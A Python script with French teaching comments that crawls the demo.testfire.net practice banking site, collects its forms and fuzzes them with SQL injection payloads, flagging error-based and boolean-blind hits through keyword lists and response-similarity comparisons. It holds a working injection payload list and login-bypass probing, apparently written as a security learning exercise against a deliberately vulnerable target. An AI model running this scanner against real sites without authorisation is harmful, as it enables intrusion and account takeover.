from bs4 import BeautifulSoup
import requests
from urllib.parse import urljoin, urlparse
import time
from collections import deque
from difflib import SequenceMatcher  # ← AJOUT pour comparaison de similarité
import re  # ← AJOUT pour normalize_text

url = 'https://demo.testfire.net'

# Configuration
MAX_PAGES = 30  # Limite de pages à crawler
VISITED = set()  # Pages déjà visitées
DELAY = 0.05  # Délai entre requêtes (politesse)

# ============================================================================
# FONCTIONS UTILITAIRES POUR L'ANALYSE DIFFÉRENTIELLE
# ============================================================================

# entrée : html (string contenant du HTML brut)
# sortie : text (string contenant seulement le texte visible)
# Process : 
#   1. Parse le HTML avec BeautifulSoup
#   2. Supprime les éléments non visibles (script, style, etc.)
#   3. Récupère tout le texte en ignorant les balises h1, div, span, etc.
#   4. Sépare les blocs avec un espace (separator=" ")
#   5. Supprime les espaces inutiles (strip=True)
def extract_text(html):
    """Extrait le texte visible d'une page HTML (VERSION AMÉLIORÉE)"""
    soup = BeautifulSoup(html, "html.parser")
    
    # Supprimer scripts, styles et autres éléments non visibles
    # Ces éléments contiennent du code qui n'est pas affiché à l'utilisateur
    for element in soup(["script", "style", "noscript", "meta", "link"]):
        element.decompose()  # .decompose() supprime complètement l'élément
    
    # Extraire le texte
    text = soup.get_text(separator=" ", strip=True)
    return text


# entrée : text (string avec des espaces multiples et irréguliers)
# sortie : text normalisé (string propre pour comparaison)
# Pourquoi ? Pour que "Hello    World" et "Hello World" soient considérés identiques
def normalize_text(text):
    """Normalise le texte pour comparaison robuste (NOUVELLE FONCTION)"""
    # Enlever espaces multiples et les remplacer par un seul espace
    # re.sub(pattern, replacement, string) remplace pattern par replacement
    # r'\s+' = un ou plusieurs espaces/tabs/newlines
    # ' ' = un seul espace
    text = re.sub(r'\s+', ' ', text)
    
    # Enlever espaces en début et fin
    text = text.strip()
    
    return text


# ============================================================================
# FONCTIONS EXISTANTES (AVEC VOS COMMENTAIRES ORIGINAUX)
# ============================================================================

def parser_html(url):
    """Analyse une page HTML et extrait liens + formulaires"""
    print(f"[→] Analyse de : {url}")
    try:   
        # from url = "https://openai.com/blog/article?id=123"
        target_domain = urlparse(url).netloc 
        # to openai.com

        page = requests.get(url, timeout=10, allow_redirects=True)
        # on obtient une page comme resultat un objet ou une structure 

        if page.status_code != 200:
            return {"error": f"Code HTTP invalide: {page.status_code}"}

        content_type = page.headers.get('Content-Type', '').lower()
        # on obtient un dictionnaire grace a headers et on utiliser .get pour obtenir content-Type pour puis on peut trouver la page html 
        
        
        if 'text/html' not in content_type:
            return {"error": f"Contenu non HTML: {content_type}"}
        # si on n'a pas de html on ne peut trouver une vulnerabilité 


        soup = BeautifulSoup(page.text, 'html.parser')
        # s'il y a de html, on peut utiliser beautifulsoup pour transformer en un objet 'parse tree'
        
        # test_links = soup.find_all('a')
        # test_links peut rassembler a une liste 
        # [
        #  <a href="https://google.com" class="btn">Google</a>,
        #  <a href="/contact">Contact</a>
        # ]


        # === EXTRACTION DES LIENS ===
        links_a = soup.find_all('a')
        # trouver des balises ou il y a des a , le probleme que on peut utiliser la balise < a pour des autres trucs pour des liens 
        # comme des cas comme # pour remonter la page ou de code javascript donc il faut traiter ces cas

        links = set()  # un set est plus rapide pour trouver des données O(1)
        for link in links_a:
            href = link.attrs.get('href')  # pour qu'on trouve la valeur de href qui peut etre un lien ou de java script etc ...
            # le retour est une string 
            if href:
                if href.startswith(('mailto:', 'tel:', 'javascript:', '#')):
                    # donc maintenant on peut utiliser la fonction startswith parce que href est un string
                    continue

                full_url = urljoin(url, href) 
                # urljoin fonctionne dans les deux cas , lien complet et lien partielle comme /contact 
                
                link_domain = urlparse(full_url).netloc
                # urlparse sert a analyser une URL en morceaux 
                # exemple si full_url = "https://openai.com/blog" => openai.com
                #


                if link_domain == target_domain:
                    # pour verfier les cas comme full_url = "https://twitter.com/openai" et link_domain = "twitter.com"
                    # twitter.com ≠ openai.com on ne peut pas l'utiliser 
                    links.add(full_url)

        # === EXTRACTION DES FORMULAIRES ===
        forms_from_html = soup.find_all('form')  
        # contient tous les form comme un exemple une liste de ... 
        # [
        #   <form action="/login">
        #      <input type="text" name="username">
        #   </form>,

        #   <form action="/search">
        #     <input type="text" name="q">
        #    </form>
        #]

        forms_data = []  # une liste qui contient les données de tous les forms 
        for form in forms_from_html:
            form_details = {}  # un dictionnaire qui contient les details de form action url , method , inputs et found_on_page
            # la forme d'un objet form 
            # Tag(
            #    name='form',
            #    attrs={'action': '/login'},
            #    children=[
            #    Tag(name='input', attrs={'type': 'text', 'name': 'username'})
            #    ]
            #)

            action = form.attrs.get("action")
            form_details["action_url"] = urljoin(url, action) if action else url
            # depend de l'action (parce que c'est optionnel)
            # Cas 1 si l'action contient un lien relatif le plus courant comme action = login.php
            # le resultat est lien complet /login.php 

            # Cas 2 si l'action contient un lien complet directement comme lien_complet/page
            # on prend directement le merge qui est directment le resultat qu'on veut 

            # Cas 3 si l'action est vide , on revient au meme page donc maintenant le lien complet est le meme lien qui contient le form
            
            if form_details["action_url"].startswith(('javascript:', 'mailto:', '#')):
              continue  # Passer au formulaire suivant
            #   Ignorer les formulaires JavaScript 

            form_details["method"] = form.attrs.get("method", "get").lower() 
            # On cherche l'attribut method
            # s'il existe → on le prend
            # s'il n'existe pas => on met "get" par défaut
            
            inputs_list = []  # une liste des inputs
            for input_tag in form.find_all(["input", "textarea", "select"]):
                # trouve les balises input , textarea et select . chaque input_tag est une ligne qui contient une balise 
                # tag = <input name="username" type="text"> un exemple dans un tour 

                input_name = input_tag.attrs.get("name")
                input_type = input_tag.attrs.get("type", "text")  # la valeur par default est text
                input_value = input_tag.attrs.get("value", "")  # la valeur par default est une liste vide 
                # apres prepare les données on peut l'ajouter dans une liste qui est inputs_list
                if input_name:
                    inputs_list.append({
                        "name": input_name, 
                        "type": input_type,
                        "value": input_value
                    })
            
            form_details["inputs"] = inputs_list
            form_details["found_on_page"] = url
            forms_data.append(form_details)

        return {
            "url": url,
            "title": soup.title.string if soup.title else "Sans titre",  # soup.title donne une balise title
            "links_found": list(links),
            "forms_found": forms_data
        }

    except requests.RequestException as e:
        return {"error": f"Erreur de connexion : {e}"}


# Maintenant le crawler 
def crawler(start_url, max_pages=MAX_PAGES):
    """Crawle le site en breadth-first search (BFS)"""
    print("\n" + "="*70)
    print("  🕷️  PHASE 1 : CRAWLING (Exploration du site)")
    print("="*70)
    
    to_visit = deque([start_url])  # (double-ended queue) pour rendre facile de ajouter/enlever au debut et a la fin 
    # ajoute a droit et retire a gauche
    visited = set()
    all_forms = []
    
    while to_visit and len(visited) < max_pages:
        current_url = to_visit.popleft()
        
        # Éviter de revisiter
        if current_url in visited:
            continue
        
        visited.add(current_url)
        
        # Analyser la page
        # result contient 
        #         return {
        #     "url": url,
        #     "title": soup.title.string if soup.title else "Sans titre", # soup.title donne une balise title
        #     "links_found": list(links),
        #     "forms_found": forms_data
        # }
        result = parser_html(current_url)
        
        if "error" in result:
            print(f"  [✗] {result['error']}")
            continue
        
        # Collecter les formulaires
        if result['forms_found']:
            all_forms.extend(result['forms_found'])
            print(f"  [✓] {len(result['forms_found'])} formulaire(s) trouvé(s)")
        else:
            print(f"  [·] Aucun formulaire")
        
        # Ajouter les nouveaux liens à explorer
        for link in result['links_found']:
            if link not in visited:
                to_visit.append(link)
        
        time.sleep(DELAY)  # Être poli avec le serveur pour pas le detruire
    
    print(f"\n[✓] Crawling terminé : {len(visited)} page(s) visitées")
    print(f"[✓] Total de formulaires trouvés : {len(all_forms)}")
    
    return all_forms, visited


def tester_sqli_form(form, payloads):
    """Teste les injections SQL avec détection par mots-clés (MÉTHODE CLASSIQUE)"""
    action_url = form['action_url']
    method = form['method']
    
    print(f"\n  [*] URL : {action_url}")
    print(f"  [*] Méthode : {method.upper()}")
    print(f"  [*] Champs : {[inp['name'] for inp in form['inputs']]}")
    
    vulnerabilities = []
    
    for payload in payloads:
        # Construire les données
        data = {}
        for input_field in form['inputs']:
            # INJECTION DANS TOUS LES CHAMPS TEXTE
            # On injecte seulement dans les champs où l'utilisateur tape du texte
            if input_field['type'] in ['text', 'password', 'email', 'search']:
                data[input_field['name']] = payload
            else:
                # Garder valeur par défaut pour hidden, submit, etc.
                # Ces champs ont des valeurs fixes qu'il ne faut pas modifier
                data[input_field['name']] = input_field['value']
        
        try:
            # Envoyer la requête
            if method == 'post':
                response = requests.post(action_url, data=data, timeout=10, allow_redirects=True)
            else:
                response = requests.get(action_url, params=data, timeout=10, allow_redirects=True)
            
            # Rechercher des indicateurs de vulnérabilité
            content_lower = response.text.lower()
            
            # Indicateurs d'erreur SQL
            # Si on voit ces mots dans la réponse, c'est qu'il y a une erreur SQL = vulnérabilité
            error_indicators = [
                'sql syntax',
                'mysql',
                'mysqli',
                'postgresql',
                'oracle',
                'sqlite',
                'microsoft sql',
                'odbc',
                'jdbc',
                'warning: mysql',
                'error in your sql',
                'you have an error in your sql syntax'
            ]
            
            # Indicateurs de succès d'authentification
            # Si on voit ces mots, c'est qu'on a réussi à se connecter = bypass
            success_indicators = [
                'welcome',
                'dashboard',
                'logout',
                # 'account',
                # 'profile',
                'successfully logged in'
            ]
            
            found_error = None
            found_success = None
            
            for indicator in error_indicators:
                if indicator in content_lower:
                    found_error = indicator
                    break
            
            for indicator in success_indicators:
                if indicator in content_lower:
                    found_success = indicator
                    break
            
            # Résultat du test
            if found_error or found_success:
                vuln = {
                    'lien': action_url,
                    'found_on': form['found_on_page'],
                    'payload': payload,
                    'status': response.status_code,
                    'type': 'ERROR_BASED' if found_error else 'AUTHENTICATION_BYPASS',
                    'method': 'KEYWORD_DETECTION',  # ← Identifiant de la méthode de détection
                    'indicator': found_error or found_success,
                    'response_length': len(response.text)
                }
                vulnerabilities.append(vuln)
                
                if found_error:
                    print(f"    [!] VULNÉRABILITÉ DÉTECTÉE (Erreur SQL)")
                    print(f"        Payload: {payload}")
                    print(f"        Indicateur: '{found_error}'")
                else:
                    print(f"    [!] VULNÉRABILITÉ POSSIBLE (Bypass)")
                    print(f"        Payload: {payload}")
                    print(f"        Indicateur: '{found_success}'")
        
        except requests.RequestException as e:
            print(f"    [✗] Erreur : {e}")
        
        time.sleep(0.03)  # Délai entre tests
    
    return vulnerabilities


# ============================================================================
# 🆕 NOUVELLE FONCTION : ANALYSE DIFFÉRENTIELLE HYBRIDE
# ============================================================================

def tester_sqli_differentiel(form):
    """Teste les injections SQL avec analyse différentielle HYBRIDE (MÉTHODE PRO)
    
    Principe : Au lieu de chercher des mots-clés, on compare les réponses
    - Requête NORMALE (baseline) : "test"
    - Requête TRUE : "' OR 1=1--" (toujours vrai en SQL)
    - Requête FALSE : "' AND 1=0--" (toujours faux en SQL)
    
    Si TRUE est très différent de FALSE, ET FALSE ressemble à NORMAL,
    alors l'injection SQL fonctionne !
    """
    action_url = form['action_url']
    method = form['method']
    
    print(f"\n  [🔬] ANALYSE DIFFÉRENTIELLE HYBRIDE")
    print(f"  [*] URL : {action_url}")
    
    vulnerabilities = []
    
    # ═══════════════════════════════════════════════════════════════
    # ÉTAPE 1 : BASELINE (Requête normale)
    # ═══════════════════════════════════════════════════════════════
    # On envoie d'abord une requête normale pour avoir une référence
    data_normal = {}
    for input_field in form['inputs']:
        if input_field['type'] in ['text', 'password', 'email', 'search']:
            data_normal[input_field['name']] = "test"  # Valeur neutre
        else:
            data_normal[input_field['name']] = input_field['value']
    
    try:
        print(f"    [1/3] Test BASELINE...")
        if method == 'post':
            response_normal = requests.post(action_url, data=data_normal, timeout=10, allow_redirects=True)
        else:
            response_normal = requests.get(action_url, params=data_normal, timeout=10, allow_redirects=True)
        
        baseline_html = response_normal.text  # HTML brut
        baseline_text = normalize_text(extract_text(baseline_html))  # Texte visible seulement
        
        print(f"          Longueur HTML  : {len(baseline_html)} chars")
        print(f"          Longueur TEXTE : {len(baseline_text)} chars")
        
    except requests.RequestException as e:
        print(f"    [✗] Erreur BASELINE : {e}")
        return vulnerabilities
    
    # ═══════════════════════════════════════════════════════════════
    # ÉTAPE 2 : Tests TRUE/FALSE
    # ═══════════════════════════════════════════════════════════════
    # On teste plusieurs paires de payloads TRUE/FALSE
    test_pairs = [
        ("' OR '1'='1'--", "' AND '1'='0'--"),  # Paire 1
        ("' OR 1=1--", "' AND 1=0--"),          # Paire 2
    ]
    
    for payload_true, payload_false in test_pairs:
        # Construire données TRUE (toujours vrai en SQL)
        data_true = {}
        for input_field in form['inputs']:
            if input_field['type'] in ['text', 'password', 'email', 'search']:
                data_true[input_field['name']] = payload_true
            else:
                data_true[input_field['name']] = input_field['value']
        
        # Construire données FALSE (toujours faux en SQL)
        data_false = {}
        for input_field in form['inputs']:
            if input_field['type'] in ['text', 'password', 'email', 'search']:
                data_false[input_field['name']] = payload_false
            else:
                data_false[input_field['name']] = input_field['value']
        
        try:
            # Envoi TRUE
            print(f"\n    [2/3] Test TRUE  : {payload_true}")
            if method == 'post':
                response_true = requests.post(action_url, data=data_true, timeout=10, allow_redirects=True)
            else:
                response_true = requests.get(action_url, params=data_true, timeout=10, allow_redirects=True)
            
            html_true = response_true.text
            text_true = normalize_text(extract_text(html_true))
            
            print(f"          Longueur HTML  : {len(html_true)} chars")
            print(f"          Longueur TEXTE : {len(text_true)} chars")
            
            # Envoi FALSE
            print(f"    [3/3] Test FALSE : {payload_false}")
            if method == 'post':
                response_false = requests.post(action_url, data=data_false, timeout=10, allow_redirects=True)
            else:
                response_false = requests.get(action_url, params=data_false, timeout=10, allow_redirects=True)
            
            html_false = response_false.text
            text_false = normalize_text(extract_text(html_false))
            
            print(f"          Longueur HTML  : {len(html_false)} chars")
            print(f"          Longueur TEXTE : {len(text_false)} chars")
            
            # ═══════════════════════════════════════════════════════════
            # ANALYSE HYBRIDE : TEXTE + HTML
            # ═══════════════════════════════════════════════════════════
            # On compare maintenant les 3 réponses (NORMAL, TRUE, FALSE)
            
            # Comparaison TEXTE (prioritaire)
            # SequenceMatcher.ratio() retourne un nombre entre 0 (totalement différent) et 1 (identique)
            ratio_text_tf = SequenceMatcher(None, text_true, text_false).ratio()
            ratio_text_fn = SequenceMatcher(None, text_false, baseline_text).ratio()
            
            # Comparaison HTML (fallback si le texte ne suffit pas)
            ratio_html_tf = SequenceMatcher(None, html_true, html_false).ratio()
            ratio_html_fn = SequenceMatcher(None, html_false, baseline_html).ratio()
            
            # Différences de longueur
            diff_len_text_true = abs(len(text_true) - len(baseline_text))
            diff_len_text_false = abs(len(text_false) - len(baseline_text))
            
            print(f"\n    📊 ANALYSE HYBRIDE :")
            print(f"       📝 TEXTE :")
            print(f"          TRUE ↔ FALSE  : {ratio_text_tf:.2%}")
            print(f"          FALSE ↔ NORMAL : {ratio_text_fn:.2%}")
            print(f"       🔧 HTML :")
            print(f"          TRUE ↔ FALSE  : {ratio_html_tf:.2%}")
            print(f"          FALSE ↔ NORMAL : {ratio_html_fn:.2%}")
            print(f"       📏 DIFF LONGUEUR TEXTE :")
            print(f"          TRUE  : {diff_len_text_true} chars")
            print(f"          FALSE : {diff_len_text_false} chars")
            
            # ═══════════════════════════════════════════════════════════
            # DÉCISION MULTI-CRITÈRES
            # ═══════════════════════════════════════════════════════════
            # On utilise 4 critères différents pour détecter la vulnérabilité
            
            detected = False
            confidence = None
            detection_technique = None
            
            # CRITÈRE 1 : Différence de TEXTE visible (MEILLEUR)
            # Si TRUE est très différent de FALSE (< 80% similaire)
            # ET FALSE est presque identique à NORMAL (> 95% similaire)
            # = L'injection change le comportement !
            if ratio_text_tf < 0.80 and ratio_text_fn > 0.95:
                detected = True
                confidence = 'HIGH'
                detection_technique = 'TEXT_COMPARISON'
                print(f"\n    🚨 CRITÈRE 1 : Différence de texte visible")
            
            # CRITÈRE 2 : Différence de LONGUEUR de texte
            # Si TRUE ajoute beaucoup de texte (> 50 chars)
            # ET FALSE reste proche de NORMAL (< 10 chars de différence)
            elif diff_len_text_true > 50 and diff_len_text_false < 10:
                detected = True
                confidence = 'HIGH'
                detection_technique = 'TEXT_LENGTH'
                print(f"\n    🚨 CRITÈRE 2 : Différence de longueur de texte")
            
            # CRITÈRE 3 : Changement de STRUCTURE HTML (texte identique)
            # Si le texte est presque identique (> 90%)
            # MAIS le HTML est très différent (< 70%)
            # = L'injection change la structure mais pas le contenu visible
            elif ratio_text_tf > 0.90 and ratio_html_tf < 0.70:
                detected = True
                confidence = 'MEDIUM'
                detection_technique = 'HTML_STRUCTURE'
                print(f"\n    ⚠️  CRITÈRE 3 : Changement de structure HTML")
            
            # CRITÈRE 4 : Différence HTML brute (fallback)
            # Si le HTML brut est différent
            elif ratio_html_tf < 0.85 and ratio_html_fn > 0.95:
                detected = True
                confidence = 'LOW'
                detection_technique = 'HTML_RAW'
                print(f"\n    ⚠️  CRITÈRE 4 : Différence HTML brute")
            
            if detected:
                vuln = {
                    'lien': action_url,
                    'found_on': form['found_on_page'],
                    'payload': payload_true,
                    'status': response_true.status_code,
                    'type': 'BOOLEAN_BASED_BLIND',
                    'method': 'DIFFERENTIAL_ANALYSIS',  # Méthode de détection
                    'detection_technique': detection_technique,  # Critère utilisé
                    'confidence': confidence,  # Niveau de confiance
                    'ratio_text_tf': f"{ratio_text_tf:.2%}",
                    'ratio_text_fn': f"{ratio_text_fn:.2%}",
                    'ratio_html_tf': f"{ratio_html_tf:.2%}",
                    'response_length': len(html_true)
                }
                vulnerabilities.append(vuln)
                print(f"    ✅ VULNÉRABILITÉ CONFIRMÉE")
                print(f"       Confiance : {confidence}")
                print(f"       Technique : {detection_technique}")
            else:
                print(f"\n    [·] Aucune vulnérabilité détectée")
        
        except requests.RequestException as e:
            print(f"    [✗] Erreur : {e}")
        
        time.sleep(0.5)  # Délai entre paires de tests
    
    return vulnerabilities


# ============================================================================
# FUZZER MODIFIÉ (avec les deux méthodes)
# ============================================================================

def fuzzer(forms, payloads, use_differential=True):
    """Phase de fuzzing : teste les injections SQL
    
    Args:
        forms: Liste des formulaires à tester
        payloads: Liste des payloads pour la méthode classique (mots-clés)
        use_differential: Si True, utilise aussi l'analyse différentielle
    """
    print("\n" + "="*70)
    print("  💥 PHASE 2 : FUZZING (Test d'injections SQL)")
    if use_differential:
        print("  Méthodes : Mots-clés + Analyse différentielle hybride")
    else:
        print("  Méthode : Mots-clés uniquement")
    print("="*70)
    
    if not forms:
        print("[!] Aucun formulaire à tester")
        return []
    
    all_vulns = []
    
    # enumerate pour creer des couples et commence par 1 : (1, form1) (2, form2) (3, form3)
    for i, form in enumerate(forms, 1):
        print(f"\n{'='*70}")
        print(f"[{i}/{len(forms)}] Test du formulaire")
        print(f"  Trouvé sur : {form['found_on_page']}")
        print(f"{'='*70}")
        
        # MÉTHODE 1 : Détection par mots-clés (rapide, efficace sur sites évidents)
        print("\n  🔍 MÉTHODE 1 : DÉTECTION PAR MOTS-CLÉS")
        vulns_keyword = tester_sqli_form(form, payloads)
        
        if vulns_keyword:
            all_vulns.extend(vulns_keyword)
            print(f"\n  [✓] {len(vulns_keyword)} vulnérabilité(s) (mots-clés)")
        else:
            print(f"\n  [·] Aucune vulnérabilité (mots-clés)")
        
        # MÉTHODE 2 : Analyse différentielle (détecte les Blind SQLi)
        if use_differential:
            print(f"\n  🔬 MÉTHODE 2 : ANALYSE DIFFÉRENTIELLE HYBRIDE")
            vulns_diff = tester_sqli_differentiel(form)
            
            if vulns_diff:
                all_vulns.extend(vulns_diff)
                print(f"\n  [✓] {len(vulns_diff)} vulnérabilité(s) (différentielle)")
            else:
                print(f"\n  [·] Aucune vulnérabilité (différentielle)")
    
    return all_vulns


def afficher_rapport(forms, vulns, pages_visited):
    """Affiche le rapport final (VERSION AMÉLIORÉE)"""
    print("\n" + "="*70)
    print("  📊 RAPPORT FINAL")
    print("="*70)
    
    print(f"\n[+] Pages explorées : {len(pages_visited)}")
    print(f"[+] Formulaires trouvés : {len(forms)}")
    print(f"[+] Vulnérabilités détectées : {len(vulns)}")
    
    if vulns:
        # Grouper par méthode de détection
        keyword_vulns = [v for v in vulns if v.get('method') == 'KEYWORD_DETECTION']
        diff_vulns = [v for v in vulns if v.get('method') == 'DIFFERENTIAL_ANALYSIS']
        
        print(f"    ├─ Par mots-clés : {len(keyword_vulns)}")
        print(f"    └─ Par analyse différentielle : {len(diff_vulns)}")
        
        print("\n" + "-"*70)
        print("  DÉTAILS DES VULNÉRABILITÉS")
        print("-"*70)
        
        for i, vuln in enumerate(vulns, 1):
            print(f"\n[{i}] Type : {vuln['type']}")
            print(f"    Méthode : {vuln.get('method', 'N/A')}")
            print(f"    Payload : {vuln['payload']}")
            
            # Affichage spécifique par méthode
            if vuln.get('method') == 'KEYWORD_DETECTION':
                print(f"    Indicateur : {vuln['indicator']}")
            
            elif vuln.get('method') == 'DIFFERENTIAL_ANALYSIS':
                if 'confidence' in vuln:
                    print(f"    Confiance : {vuln['confidence']}")
                if 'detection_technique' in vuln:
                    print(f"    Technique : {vuln['detection_technique']}")
                if 'ratio_text_tf' in vuln:
                    print(f"    Ratios TEXTE :")
                    print(f"      - TRUE/FALSE  : {vuln['ratio_text_tf']}")
                    print(f"      - FALSE/NORMAL: {vuln['ratio_text_fn']}")
                if 'ratio_html_tf' in vuln:
                    print(f"    Ratios HTML :")
                    print(f"      - TRUE/FALSE  : {vuln['ratio_html_tf']}")
            
            print(f"    Code HTTP : {vuln['status']}")
            print(f"    Lien : {vuln['lien']}")
            print(f"    Trouvé sur : {vuln['found_on']}")
    else:
        print("\n[✓] Aucune vulnérabilité SQL évidente détectée")
    
    print("\n" + "="*70)


def main():
    target = 'https://demo.testfire.net'
    
    print("="*70)
    print("  🔍 SCANNER DE VULNÉRABILITÉS SQL - VERSION AMÉLIORÉE")
    print("="*70)
    
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "admin' OR '1'='1",
        "admin'--",
        "' UNION SELECT NULL--",
        "1' OR '1'='1",
        "admin' #",
        "' OR 'a'='a"
    ]
    
    # ✅ PHASE 1 : CRAWLING
    forms, pages = crawler(target, max_pages=30)
    
    # # ✅ AJOUT : Tester manuellement la page de login si elle n'a pas été trouvée
    # login_urls = [
    #     '/login.jsp',
    #     '/bank/login.jsp',
    #     '/doLogin',
    # ]
    
    # for login_path in login_urls:
    #     login_url = urljoin(target, login_path)
    #     if login_url not in [form['found_on_page'] for form in forms]:
    #         print(f"\n[INFO] Test manuel de la page de login : {login_url}")
    #         result = parser_html(login_url)
    #         if "error" not in result and result['forms_found']:
    #             forms.extend(result['forms_found'])
    #             print(f"  [✓] {len(result['forms_found'])} formulaire(s) de login trouvé(s)")
    
    # PHASE 2 : FUZZING
    vulns = fuzzer(forms, payloads, use_differential=True)
    
    # PHASE 3 : RAPPORT
    afficher_rapport(forms, vulns, pages)
    print(pages)
if __name__ == "__main__":
    main()